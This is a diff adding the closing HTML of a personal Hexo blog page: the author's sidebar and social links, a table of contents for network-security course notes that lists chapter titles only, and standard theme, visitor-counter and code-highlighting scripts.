+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="王嘉熙" />
+            
+              <p class="site-author-name" itemprop="name">王嘉熙</p>
+              <p class="site-description motion-element" itemprop="description">Nothing is impossible</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/08163182" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wjx15896427883@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/Jason_wang9527" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://instagram.com/jason_wang9527" target="_blank" title="Instagram">
+                      
+                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概论"><span class="nav-number">1.</span> <span class="nav-text">概论</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CIA三元组"><span class="nav-number">1.1.</span> <span class="nav-text">CIA三元组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络攻击类型"><span class="nav-number">1.2.</span> <span class="nav-text">网络攻击类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全属性分5类"><span class="nav-number">1.2.1.</span> <span class="nav-text">安全属性分5类:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击方式"><span class="nav-number">1.2.2.</span> <span class="nav-text">攻击方式:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OSI安全体系："><span class="nav-number">1.3.</span> <span class="nav-text">OSI安全体系：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5类安全服务"><span class="nav-number">1.3.1.</span> <span class="nav-text">5类安全服务:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8种安全机制："><span class="nav-number">1.3.2.</span> <span class="nav-text">8种安全机制：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第一章-攻击流程和渗透测试"><span class="nav-number">2.</span> <span class="nav-text">第一章 攻击流程和渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#黑客攻击流程"><span class="nav-number">2.1.</span> <span class="nav-text">黑客攻击流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搜索引擎技巧"><span class="nav-number">2.2.</span> <span class="nav-text">搜索引擎技巧:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试七个阶段："><span class="nav-number">2.3.</span> <span class="nav-text">渗透测试七个阶段：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#踩点途径"><span class="nav-number">2.4.</span> <span class="nav-text">踩点途径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扫描"><span class="nav-number">2.5.</span> <span class="nav-text">扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查点"><span class="nav-number">2.6.</span> <span class="nav-text">查点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#旗标抓取"><span class="nav-number">2.6.1.</span> <span class="nav-text">旗标抓取</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二章网络嗅探"><span class="nav-number">3.</span> <span class="nav-text">第二章网络嗅探</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第三章口令破解与防御"><span class="nav-number">4.</span> <span class="nav-text">第三章口令破解与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#命令功能及使用"><span class="nav-number">4.1.</span> <span class="nav-text">命令功能及使用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第四章欺骗技术与防御"><span class="nav-number">5.</span> <span class="nav-text">第四章欺骗技术与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-IP欺骗"><span class="nav-number">5.1.</span> <span class="nav-text">0x01 IP欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击"><span class="nav-number">5.1.1.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">5.1.2.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARP欺骗"><span class="nav-number">5.2.</span> <span class="nav-text">ARP欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击-1"><span class="nav-number">5.2.1.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御-1"><span class="nav-number">5.2.2.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第五章Web欺骗与防御"><span class="nav-number">6.</span> <span class="nav-text">第五章Web欺骗与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入攻击原理"><span class="nav-number">6.1.</span> <span class="nav-text">SQL注入攻击原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击-2"><span class="nav-number">6.1.1.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御-2"><span class="nav-number">6.1.2.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击-3"><span class="nav-number">6.2.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防御-3"><span class="nav-number">6.2.1.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第六章缓冲区溢出漏洞"><span class="nav-number">7.</span> <span class="nav-text">第六章缓冲区溢出漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区溢出原理"><span class="nav-number">7.1.</span> <span class="nav-text">缓冲区溢出原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出"><span class="nav-number">7.2.</span> <span class="nav-text">栈溢出:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区溢出攻击的基本类型："><span class="nav-number">7.3.</span> <span class="nav-text">缓冲区溢出攻击的基本类型：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御-4"><span class="nav-number">7.4.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第七章拒绝服务"><span class="nav-number">8.</span> <span class="nav-text">第七章拒绝服务</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-DOS攻击"><span class="nav-number">8.1.</span> <span class="nav-text">0x01 DOS攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02"><span class="nav-number">8.2.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御-5"><span class="nav-number">8.3.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DDOS"><span class="nav-number">8.4.</span> <span class="nav-text">DDOS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第八章身份认证"><span class="nav-number">9.</span> <span class="nav-text">第八章身份认证</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#AAA"><span class="nav-number">9.1.</span> <span class="nav-text">AAA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#身份认证"><span class="nav-number">9.1.1.</span> <span class="nav-text">身份认证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos协议"><span class="nav-number">9.2.</span> <span class="nav-text">Kerberos协议</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第九章VPN"><span class="nav-number">10.</span> <span class="nav-text">第九章VPN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念"><span class="nav-number">10.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#层次和类型"><span class="nav-number">10.2.</span> <span class="nav-text">层次和类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隧道协议"><span class="nav-number">10.3.</span> <span class="nav-text">隧道协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPSec"><span class="nav-number">10.4.</span> <span class="nav-text">IPSec</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">王嘉熙</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4
+<span>   |   </span>
+<span id="showDays"></span>
+</div>
+
+
+
+
+<script>
+  var seconds = 1000;
+  var minutes = seconds * 60;
+  var hours = minutes * 60;
+  var days = hours * 24;
+  var years = days * 365;
+  var birthDay = Date.UTC(2018,02,10,00,00,00); // 这里设置建站时间
+  setInterval(function() {
+    var today = new Date();
+    var todayYear = today.getFullYear();
+    var todayMonth = today.getMonth()+1;
+    var todayDate = today.getDate();
+    var todayHour = today.getHours();
+    var todayMinute = today.getMinutes();
+    var todaySecond = today.getSeconds();
+    var now = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+    var diff = now - birthDay;
+    var diffYears = Math.floor(diff/years);
+    var diffDays = Math.floor((diff/days)-diffYears*365);
+    var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+    var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+    var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+      document.getElementById('showDays').innerHTML="博客已运行 "+diffYears+" 年 "+diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+  }, 1000);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("s8OK1yas4CmWRhxmuW1FJq2Q-gzGzoHsz", "uY78z9PJL2vdt76Nv08OYE3R");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+
+<!-- 页面点击小心心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.12.0/styles/atom-one-dark.min.css">
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script type="text/javascript">
+  $(function() {
+    hljs.initHighlighting();
+    $('pre code').each(function() {
+      var lines = $(this).text().split('\n').length - 1;
+      var $numbering = $('<ul/>').addClass('pre-numbering');
+      $(this)
+        .addClass('has-numbering')
+        .parent()
+        .append($numbering);
+      for (i = 1; i <= lines; i++) {
+        $numbering.append($('<li/>'));
+      }
+    });
+  });
+
+</script>
+
+<style>
+  pre {
+    position: relative;
+    padding: 0;
+  }
+
+  code.has-numbering {
+    margin-left: 2.5rem;
+  }
+
+  code.has-numbering::-webkit-scrollbar {
+    display: none;
+  }
+
+  .pre-numbering {
+    margin: 0;
+    position: absolute;
+    top: 0;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    height: 100%;
+  }
+
+  .pre-numbering li {
+    list-style-type: decimal-leading-zero !important;
+  }
+
+  @media (max-width: 760px) {
+    .post-body pre {
+      padding: 0px;
+    }
+
+    .post-body .pre-numbering {
+      display: none;
+    }
+
+    code.has-numbering {
+      margin: 0;
+    }
+  }
+
+</style>
+
+</html>
